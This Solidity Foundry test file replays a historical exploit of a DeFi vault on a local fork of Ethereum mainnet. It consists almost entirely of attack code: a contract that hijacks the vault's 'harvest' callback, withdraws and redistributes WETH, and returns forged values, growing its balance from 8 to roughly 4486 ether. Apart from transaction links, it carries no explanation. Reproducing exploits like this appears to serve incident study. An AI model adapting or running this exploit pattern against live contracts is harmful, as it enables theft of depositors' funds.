// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x38ecc8363836e43aca99d994bb9325a8f3770d7a1d1fffd62c82cf5230525836
// https://etherscan.io/address/0x51e029a5Ef288Fb87C5e8Dd46895c353ad9AaAeC

interface I {
    function balanceOf(address) external payable returns (uint256);
    function approve(address, uint256) external payable;
    function harvest(uint256) external payable;
    function transfer(address, uint256) external payable;
    function distribute(address, uint256) external payable;
    function totalValue() external payable;
    function token() external payable;
    function lowerHasMinted(uint256) external payable;
    function withdraw(address, uint256) external payable;
}

contract X6b56 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x38ecc8363836e43aca99d994bb9325a8f3770d7a1d1fffd62c82cf5230525836");
    }

    address constant x0100 = 0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6;
    address constant x45f8 = 0x45f81eF5F2ae78f49851f7A62e4061FF54Ff674B;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8392 = 0x8392F6669292fA56123F71949B52d883aE57e225;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xeba6 = 0xEBA649E0010818Aa4321088D34bD6162d65E7971;

    uint256 t_harvest = 0;

    function test1() public {
        // vm.startPrank(0x51e029a5Ef288Fb87C5e8Dd46895c353ad9AaAeC, 0x51e029a5Ef288Fb87C5e8Dd46895c353ad9AaAeC);

        vm.createSelectFork("http://localhost:18545", 12645429); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x4fa64411ccd2982c43947a54b8e780ea6523da5c7e0c9545bf85697422b21577));

        // https://explorer.phalcon.xyz/tx/eth/0x4fa64411ccd2982c43947a54b8e780ea6523da5c7e0c9545bf85697422b21577
        this.x4fa64411();
        // https://explorer.phalcon.xyz/tx/eth/0x3cc071f9f40294bb250fc7b9aa6b2d7e6ca5707ce4d6d222157d7a0feef618b3
        this.x3cc071f9();
        // https://explorer.phalcon.xyz/tx/eth/0x38ecc8363836e43aca99d994bb9325a8f3770d7a1d1fffd62c82cf5230525836
        harvest(0);
    }

    function test2() public {
        // vm.startPrank(0x51e029a5Ef288Fb87C5e8Dd46895c353ad9AaAeC, 0x51e029a5Ef288Fb87C5e8Dd46895c353ad9AaAeC);

        vm.createSelectFork("http://localhost:18545", 12644671); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x4fa64411ccd2982c43947a54b8e780ea6523da5c7e0c9545bf85697422b21577
        this.x4fa64411();
        vm.warp(1623845627);
        vm.roll(12645421);
        // https://explorer.phalcon.xyz/tx/eth/0x3cc071f9f40294bb250fc7b9aa6b2d7e6ca5707ce4d6d222157d7a0feef618b3
        this.x3cc071f9();
        vm.warp(1623845707);
        vm.roll(12645429);
        // https://explorer.phalcon.xyz/tx/eth/0x38ecc8363836e43aca99d994bb9325a8f3770d7a1d1fffd62c82cf5230525836
        harvest(0);
    }

    function x4fa64411() public {
        X6b56(payable(r)).harvest(0);
    }

    function harvest(uint256) public {
        t_harvest++;

        if (t_harvest == 1) {
            I(xeba6).totalValue();
            I(xeba6).totalValue();
            I(xeba6).token();
            // uint256 v1 = 8000000000000000000;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "8000000000000000000 (8.0 ether)");
            I(xeba6).totalValue();
            I(xeba6).withdraw(r, 83313729924048730);
            // uint256 v2 = 8083313729924048729;
            uint256 v2 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "8083313729924048729 (8.8331 ether)");
            I(xeba6).totalValue();
            I(xc02a).transfer(x8392, 8331372992404872);
            I(xc02a).approve(x45f8, 74982356931643857);
            I(x45f8).distribute(r, 74982356931643857);
            I(x0100).lowerHasMinted(74982356931643857);

            bytes memory rt =
                hex"0000000000000000000000000000000000000000000000000127fd655d0927590000000000000000000000000000000000000000000000000127fd655d09275a";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_harvest == 2) {
            I(xeba6).totalValue();
            I(xeba6).totalValue();
            I(xeba6).token();
            // uint256 v1 = 178153696262971613079;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "178153696262971613079 (178.1536 ether)");
            I(xeba6).totalValue();
            I(xeba6).withdraw(r, 4308144937764982866415);
            // uint256 v2 = 4486298634027954481844;
            uint256 v2 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "4486298634027954481844 (4486.2986 ether)");
            I(xeba6).totalValue();
            I(xc02a).transfer(x8392, 430814493776498286876);
            I(xc02a).approve(x45f8, 3877330443988484581889);
            I(x45f8).distribute(r, 3877330443988484581889);
            I(x0100).lowerHasMinted(3877330443988484581889);

            bytes memory rt =
                hex"0000000000000000000000000000000000000000000000e98b85735dfb27cb1d0000000000000000000000000000000000000000000000e98b85735dfb27c1ef";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function x3cc071f9() public {
        I(x45f8).harvest(0);
    }

    fallback() external payable {
        revert("no such function");
    }
}
